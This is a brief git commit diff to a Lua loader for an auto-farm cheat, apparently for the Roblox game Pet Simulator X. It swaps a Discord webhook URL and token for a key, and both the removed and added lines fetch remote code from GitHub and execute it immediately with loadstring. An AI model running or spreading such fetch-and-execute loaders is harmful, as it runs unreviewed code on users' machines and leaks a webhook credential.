711affef4fcf259b7588d65955f76ccb6baad7d2
Psx-Script <120688763+Psx-Script@users.noreply.github.com>
2022-12-20 09:31:25 +0300

    Update HasteFarm.lua

--- HasteFarm.lua
+++ HasteFarm.lua
@@ -1,3 +1,2 @@
-_G.UserID = 1803819784
-_G.WebHook = "https://discord.com/api/webhooks/1052617269177495582/oYPWIyt3VYup7NEDszMiy4tzMLukTNsxcvRPplVxt3xoBgMS5thIyZg_Cn3VHvf5lgGu"
-loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
+_G.Key = "021naros"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script-v4-1.lua"))()
